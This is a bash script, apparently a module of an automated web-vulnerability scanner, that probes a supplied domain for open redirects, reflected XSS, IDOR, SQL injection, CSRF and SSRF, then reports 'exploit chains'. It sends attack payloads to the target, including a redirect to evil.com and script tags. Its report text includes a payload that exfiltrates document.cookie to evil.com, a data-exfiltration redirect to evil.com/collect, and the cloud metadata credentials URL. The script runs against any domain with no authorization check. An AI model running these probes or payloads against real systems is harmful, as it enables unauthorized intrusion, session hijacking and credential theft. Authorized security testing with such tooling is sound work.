#!/usr/bin/env bash
# chained_vuln_phase.sh - Chained-vulnerability graph traversal,
# multi-step exploit chains, impact amplification analysis.

chained_vuln_phase() {
    local domain="$1"
    if [[ -z "$domain" ]]; then
        log "ERROR" "chained_vuln_phase: No domain provided"
        return 1
    fi

    source "$(dirname "$0")/../core/core.sh" 2>/dev/null || true

    local output_dir="$OUTPUT_DIR/$domain/recon_$TIMESTAMP"
    mkdir -p "$output_dir/chained_vuln"

    local results=0
    local chains_file="$output_dir/chained_vuln/vuln_chains.txt"
    local impact_file="$output_dir/chained_vuln/chain_impact.txt"

    log "INFO" "Starting chained-vulnerability analysis for $domain"

    tool_available curl || { log "WARN" "curl not found - skipping"; return 0; }

    local temp_dir
    temp_dir=$(mktemp -d)

    # Phase 1: Discover base vulnerabilities for chain building
    log "INFO" "Phase 1: Discovering base vulnerabilities"

    local vuln_endpoints=()
    local vuln_types=()

    # Check for open redirects
    local redirect_paths=("/redirect" "/goto" "/url" "/link" "/out" "/external" "/forward" "/r")
    for path in "${redirect_paths[@]}"; do
        local redir_url="https://${domain}${path}?url=https://evil.com"
        local redir_status
        redir_status=$(curl -s -o /dev/null -w "%{http_code}\n%{redirect_url}" -m 10 -L "$redir_url" 2>/dev/null || true)
        local redir_code
        redir_code=$(echo "$redir_status" | head -1)
        local redir_loc
        redir_loc=$(echo "$redir_status" | tail -1)

        if [[ "$redir_loc" == *"evil.com"* ]]; then
            echo "[OPEN-REDIRECT] $path?url= parameter reflects attacker domain" >> "$chains_file"
            vuln_endpoints+=("$redir_url")
            vuln_types+=("open_redirect")
            ((results++)) || true
        fi
    done

    # Check for XSS reflected parameters
    local xss_params=("q" "search" "query" "name" "input" "text" "value" "callback" "redirect" "next" "return" "url")
    for param in "${xss_params[@]}"; do
        local xss_url="https://${domain}/?${param}=<script>alert(1)</script>"
        local xss_resp
        xss_resp=$(curl -s -m 10 "$xss_url" 2>/dev/null || true)
        if echo "$xss_resp" | grep -q "<script>alert(1)</script>" 2>/dev/null; then
            echo "[XSS-REFLECTED] Parameter '$param' reflects payload unescaped" >> "$chains_file"
            vuln_endpoints+=("$xss_url")
            vuln_types+=("xss")
            ((results++)) || true
        fi
    done

    # Check for IDOR on user/resource endpoints
    local idor_paths=(
        "/api/user/1"
        "/api/users/1/profile"
        "/api/account/1"
        "/api/order/1"
        "/api/invoice/1"
        "/api/document/1"
    )
    for path in "${idor_paths[@]}"; do
        local idor_url="https://${domain}${path}"
        local idor_status
        idor_status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 "$idor_url" 2>/dev/null || echo "000")
        if [[ "$idor_status" == "200" ]]; then
            # Test with incremented ID
            local alt_url="${path%/[0-9]*/}"
            local alt_status
            alt_status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 "https://${domain}${alt_url}/2" 2>/dev/null || echo "000")
            if [[ "$alt_status" == "200" ]]; then
                echo "[IDOR] $path accessible with sequential ID manipulation" >> "$chains_file"
                vuln_endpoints+=("$idor_url")
                vuln_types+=("idor")
                ((results++)) || true
            fi
        fi
    done

    # Check for SQL injection indicators
    local sqli_params=("id" "user" "page" "cat" "item" "product" "sort" "order")
    for param in "${sqli_params[@]}"; do
        local sqli_url="https://${domain}/?${param}=1%27"
        local sqli_resp
        sqli_resp=$(curl -s -m 10 "$sqli_url" 2>/dev/null || true)
        if echo "$sqli_resp" | grep -qiE "(sql|syntax|mysql|postgres|oracle|error|query|unclosed)" 2>/dev/null; then
            echo "[SQLI-INDICATOR] Parameter '$param' shows SQL error indicators" >> "$chains_file"
            vuln_endpoints+=("$sqli_url")
            vuln_types+=("sqli")
            ((results++)) || true
        fi
    done

    # Phase 2: Chain Open Redirect + XSS (cookie stealing chain)
    log "INFO" "Phase 2: Testing Open Redirect + XSS chain"

    local has_redirect=false
    local has_xss=false
    for vt in "${vuln_types[@]}"; do
        [[ "$vt" == "open_redirect" ]] && has_redirect=true
        [[ "$vt" == "xss" ]] && has_xss=true
    done

    if $has_redirect && $has_xss; then
        echo "[CHAIN-1] Open Redirect + XSS -> Cookie Theft" >> "$impact_file"
        echo "  Impact: Attacker can craft URL that redirects to XSS-laden page" >> "$impact_file"
        echo "  Payload: redirect?url=https://target.com/?xss_param=<script>document.location='https://evil.com/?c='+document.cookie</script>" >> "$impact_file"
        echo "  Severity: CRITICAL - Full account takeover via session hijacking" >> "$impact_file"
        echo "---" >> "$impact_file"
        ((results++)) || true
    fi

    # Phase 3: Chain IDOR + Open Redirect (data exfiltration chain)
    log "INFO" "Phase 3: Testing IDOR + Open Redirect chain"

    local has_idor=false
    for vt in "${vuln_types[@]}"; do
        [[ "$vt" == "idor" ]] && has_idor=true
    done

    if $has_idor && $has_redirect; then
        echo "[CHAIN-2] IDOR + Open Redirect -> Data Exfiltration" >> "$impact_file"
        echo "  Impact: Access other users' data and exfiltrate via redirect" >> "$impact_file"
        echo "  Payload: Access /api/user/2/profile, then /redirect?url=https://evil.com/collect?data=<profile_data>" >> "$impact_file"
        echo "  Severity: HIGH - Mass data breach across all user accounts" >> "$impact_file"
        echo "---" >> "$impact_file"
        ((results++)) || true
    fi

    # Phase 4: Chain IDOR + SQLi (database exfiltration chain)
    log "INFO" "Phase 4: Testing IDOR + SQLi chain"

    local has_sqli=false
    for vt in "${vuln_types[@]}"; do
        [[ "$vt" == "sqli" ]] && has_sqli=true
    done

    if $has_idor && $has_sqli; then
        echo "[CHAIN-3] IDOR + SQLi -> Database Exfiltration" >> "$impact_file"
        echo "  Impact: Use IDOR to identify table structure, SQLi to extract data" >> "$impact_file"
        echo "  Payload: IDOR to enumerate IDs, then UNION-based SQLi on parameter" >> "$impact_file"
        echo "  Severity: CRITICAL - Full database compromise and data exfiltration" >> "$impact_file"
        echo "---" >> "$impact_file"
        ((results++)) || true
    fi

    # Phase 5: Chain Open Redirect + CSRF (account takeover chain)
    log "INFO" "Phase 5: Testing Open Redirect + CSRF chain"

    if $has_redirect; then
        local csrf_endpoints=(
            "/api/email/change"
            "/api/password/change"
            "/api/settings/update"
            "/api/account/delete"
            "/api/2fa/disable"
        )

        for ep in "${csrf_endpoints[@]}"; do
            local csrf_status
            csrf_status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 \
                -X POST -d "test=1" "https://${domain}${ep}" 2>/dev/null || echo "000")
            if [[ "$csrf_status" != "404" && "$csrf_status" != "000" ]]; then
                echo "[CHAIN-4] Open Redirect + CSRF ($ep) -> Account Takeover" >> "$impact_file"
                echo "  Impact: Redirect to page that auto-submits CSRF to change email/password" >> "$impact_file"
                echo "  Severity: CRITICAL - Complete account takeover" >> "$impact_file"
                echo "---" >> "$impact_file"
                ((results++)) || true
                break
            fi
        done
    fi

    # Phase 6: Chained SSRF if internal endpoints discovered
    log "INFO" "Phase 6: Testing SSRF chain vectors"

    local ssrf_params=("url" "uri" "path" "site" "dest" "redirect" "load" "fetch" "src")
    for param in "${ssrf_params[@]}"; do
        local ssrf_url="https://${domain}/?${param}=http://127.0.0.1"
        local ssrf_resp
        ssrf_resp=$(curl -s -m 10 "$ssrf_url" 2>/dev/null || true)
        local ssrf_code
        ssrf_code=$(curl -s -o /dev/null -w "%{http_code}" -m 10 "$ssrf_url" 2>/dev/null || echo "000")

        if echo "$ssrf_resp" | grep -qiE "(admin|internal|debug|metrics|health|version|env)" 2>/dev/null; then
            echo "[SSRF-CHAIN] Parameter '$param' enables internal network access" >> "$chains_file"
            vuln_endpoints+=("$ssrf_url")
            vuln_types+=("ssrf")
            ((results++)) || true
        fi
    done

    # Phase 7: Chain SSRF + Cloud Metadata
    local has_ssrf=false
    for vt in "${vuln_types[@]}"; do
        [[ "$vt" == "ssrf" ]] && has_ssrf=true
    done

    if $has_ssrf; then
        echo "[CHAIN-5] SSRF + Cloud Metadata -> Credential Theft" >> "$impact_file"
        echo "  Impact: Access cloud metadata endpoints for IAM credentials" >> "$impact_file"
        echo "  Targets: http://169.254.169.254/latest/meta-data/iam/security-credentials/" >> "$impact_file"
        echo "  Severity: CRITICAL - Cloud infrastructure compromise" >> "$impact_file"
        echo "---" >> "$impact_file"
        ((results++)) || true
    fi

    # Phase 8: Build vulnerability graph
    log "INFO" "Phase 8: Building vulnerability graph"

    if [[ ${#vuln_types[@]} -gt 0 ]]; then
        echo "[GRAPH] Vulnerability Chain Graph for $domain:" >> "$chains_file"
        echo "  Nodes: ${#vuln_endpoints[@]} discovered vulnerabilities" >> "$chains_file"
        echo "  Types: $(printf '%s ' "${vuln_types[@]}")" >> "$chains_file"
        echo "  Potential chains: $(( ${#vuln_types[@]} * (${#vuln_types[@]} - 1) / 2 ))" >> "$chains_file"
        echo "---" >> "$chains_file"
        ((results++)) || true
    fi

    # Cleanup
    rm -rf "$temp_dir" 2>/dev/null || true

    # Write count
    echo "$results" > "$output_dir/chained_vuln/count.txt"

    # Write structured findings via phase_bridge
    if [[ -f "$(dirname "$0")/../core/phase_bridge.sh" ]]; then
        source "$(dirname "$0")/../core/phase_bridge.sh" 2>/dev/null || true
        while IFS= read -r line; do
            write_finding "chained_vuln" "CRITICAL" "$line" 2>/dev/null || true
        done < "$impact_file" 2>/dev/null || true
        while IFS= read -r line; do
            write_finding "chained_vuln" "HIGH" "$line" 2>/dev/null || true
        done < "$chains_file" 2>/dev/null || true
    fi

    py_log "INFO" "chained_vuln_phase" "Completed for $domain" "results=$results" 2>/dev/null || true
    log "INFO" "Chained vulnerability phase complete: $results findings for $domain"
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    chained_vuln_phase "$@"
fi
